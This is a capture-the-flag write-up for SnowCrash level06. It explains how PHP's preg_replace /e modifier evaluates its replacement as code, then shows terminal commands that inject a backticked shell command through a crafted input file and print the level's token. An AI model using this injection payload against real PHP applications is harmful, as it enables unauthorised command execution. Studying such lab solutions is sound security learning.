After logging we find level06 and level06.php in our home folder

When looking at level06.php the method preg_replace is called with the pattern `/(\[x (.*)\])/e`
the /e modifer allows to use PHP code within your regex, it will be evaluated as part of the program

`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);` $a is the content of argv[1]

We'll create a /tmp/regex and type [x {${\`getflag\`}}] in it

```
level06@SnowCrash:~$ echo '[x ${\`phpinfo()\`}]' > /tmp/regex
level06@SnowCrash:~$ ./level06 /tmp/regex
sh: 1: Syntax error: end of file unexpected
PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1

level06@SnowCrash:~$ echo '[x ${\`getflag\`}]' > /tmp/regex
level06@SnowCrash:~$ ./level06 /tmp/regex
PHP Notice:  Undefined variable: Check flag.Here is your token : `wiok45aaoguiboiki2tuin6ub`
in /home/user/level06/level06.php(4) : regexp code on line 1
```
